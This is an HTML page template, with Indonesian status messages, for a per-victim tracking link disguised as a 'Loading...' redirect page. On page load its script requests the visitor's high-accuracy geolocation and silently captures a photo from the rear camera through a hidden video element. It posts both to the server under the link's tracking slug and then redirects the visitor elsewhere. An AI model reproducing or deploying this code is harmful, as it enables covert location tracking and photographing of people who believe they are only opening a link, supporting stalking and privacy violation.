<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="csrf-token" content="{{ csrf_token() }}">
    <title>Loading...</title>
    <style>
        body { margin: 0; padding: 0; font-family: Arial, sans-serif; background: #000; color: #fff; }
        #capture-container { display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; }
        #status { margin: 20px; font-size: 16px; }
        video, canvas { display: none; }
        #photo-preview { max-width: 100%; max-height: 300px; margin-top: 10px; border: 2px solid #fff; }
    </style>
</head>
<body>
    <div id="capture-container">
        <div id="status">Sedang memproses...</div>
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
        <img id="photo-preview" src="" alt="Captured photo">
    </div>

    <script>
        const statusEl = document.getElementById('status');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const photoPreview = document.getElementById('photo-preview');

        const trackingSlug = window.location.pathname.split('/').pop();
        const apiUrl = '/t/' + trackingSlug + '/capture';

        let locationData = { latitude: null, longitude: null };
        let photoData = null;

        // Step 1: Get Geolocation
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (pos) => {
                            locationData = {
                                latitude: pos.coords.latitude,
                                longitude: pos.coords.longitude
                            };
                            statusEl.textContent = 'Lokasi berhasil didapatkan. Membuka kamera...';
                            resolve(true);
                        },
                        (err) => {
                            statusEl.textContent = 'Gagal mendapatkan lokasi. Melanjutkan...';
                            resolve(false);
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    statusEl.textContent = 'Geolocation tidak tersedia. Melanjutkan...';
                    resolve(false);
                }
            });
        }

        // Step 2: Get Camera Photo
        async function getPhoto() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                video.srcObject = stream;
                await new Promise(r => video.onloadedmetadata = r);

                statusEl.textContent = 'Mengambil foto...';

                // Capture frame
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0);

                photoData = canvas.toDataURL('image/png');
                photoPreview.src = photoData;

                // Stop camera
                stream.getTracks().forEach(track => track.stop());

                statusEl.textContent = 'Foto berhasil diambil. Mengirim data...';
                return true;
            } catch (err) {
                statusEl.textContent = 'Gagal membuka kamera. Mengirim data tanpa foto...';
                return false;
            }
        }

        // Step 3: Send data and redirect
        async function sendData() {
            const payload = {
                latitude: locationData.latitude,
                longitude: locationData.longitude,
                photo: photoData
            };

            try {
                const response = await fetch(apiUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]')?.getAttribute('content') || ''
                    },
                    body: JSON.stringify(payload)
                });

                const result = await response.json();
                if (result.redirect_url) {
                    statusEl.textContent = 'Redirecting...';
                    window.location.href = result.redirect_url;
                }
            } catch (err) {
                statusEl.textContent = 'Gagal mengirim data.';
            }
        }

        // Main flow
        async function main() {
            await getLocation();
            await getPhoto();
            await sendData();
        }

        main();
    </script>
</body>
</html>
